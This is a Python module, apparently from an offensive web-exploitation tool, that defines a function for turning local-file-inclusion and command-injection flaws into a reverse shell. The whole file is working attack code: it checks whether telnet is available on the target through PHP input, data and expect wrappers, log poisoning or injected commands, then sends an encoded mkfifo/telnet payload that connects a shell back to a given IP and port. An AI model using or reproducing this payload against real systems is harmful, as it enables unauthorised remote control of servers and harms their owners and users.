from src.httpreqs import request
from src.configs import config
from src.utils.encodings import encode
from src.utils.args_check import headers
from src.utils.arguments import args
from src.attacks.logPoison import exploit_log_poison
from src.utils.info import printInfo

def exploit_telnet(exploit, method, ip, port):

    url = exploit['GETVAL']
    post = exploit['POSTVAL']
    
    telnetTest = "which%20telnet"
    telnetPayload = "rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|telnet+{0}+{1}+>/tmp/f".format(ip, str(port))

    if(method == "INPUT"):
        res, _ = request.REQUEST(url.replace(config.tempArg, encode(telnetTest)), args.httpheaders, exploit['POSTVAL'], config.proxies, "", "")
        if("/bin" in res.text and "/telnet" in res.text):
            u = url.replace(config.tempArg, encode(telnetPayload))
            printInfo(ip, port, "telnet", "input wrapper")
            request.REQUEST(u, args.httpheaders, exploit['POSTVAL'], config.proxies, "", "")
            return True
    if(method == "DATA"):
        if(args.postreq): 
            res, _ = request.REQUEST(url.replace(config.tempArg, encode(telnetTest)), args.httpheaders, post, config.proxies, "", "")
        else:
            res,_ = request.REQUEST(url.replace(config.tempArg, encode(telnetTest)), args.httpheaders, config.proxies, "", "")
        if("/bin" in res.text and "/telnet" in res.text):
            u = url.replace(config.tempArg, encode(telnetPayload))
            printInfo(ip, port, "telnet", "data wrapper")
            if(args.postreq):
                request.REQUEST(url.replace(config.tempArg, encode(telnetPayload)), args.httpheaders, post, config.proxies, "", "")
            else:
                request.REQUEST(u, args.httpheaders, config.proxies, "", "")
            return True
    if(method == "EXPECT"):
        if(args.postreq):
            res, _ = request.REQUEST(url, args.httpheaders, post.replace(config.tempArg, encode(telnetPayload)), config.proxies, "", "")
        else:
            res, _ = request.REQUEST(url.replace(config.tempArg, encode(telnetTest)), args.httpheaders, config.proxies, "", "")
        if("/bin" in res.text and "/telnet" in res.text):
            u = url.replace(config.tempArg, encode(telnetPayload))
            printInfo(ip, port, "telnet", "expect wrapper")
            if(args.postreq):
                request.REQUEST(url, args.httpheaders, post.replace(config.tempArg, encode(telnetPayload)), config.proxies, "", "")
            else:
                request.REQUEST(u, args.httpheaders, config.proxies, "", "")
            return True
    if(method == "TRUNC"):
        exploit_log_poison(ip, port, url, encode(telnetPayload), "", encode(telnetTest), "/telnet", exploit['POSTVAL'])
        return True

    if(method == "CMD"):
        if(args.postreq): 
            res, _ = request.REQUEST(url, args.httpheaders, post.replace(config.tempArg, encode(telnetTest)), config.proxies, "", "")
        else:
            res, _ = request.REQUEST(url.replace(config.tempArg, encode(telnetTest)), args.httpheaders, config.proxies, "", "")
        if("/bin" in res.text and "/telnet" in res.text):
            printInfo(ip, port, "telnet", "command injection")
            if(args.postreq):
                request.REQUEST(url, args.httpheaders, post.replace(config.tempArg, encode(telnetPayload)), config.proxies, "", "")
            else:
                request.REQUEST(url.replace(config.tempArg, encode(telnetPayload)), args.httpheaders, config.proxies, "", "")
            return True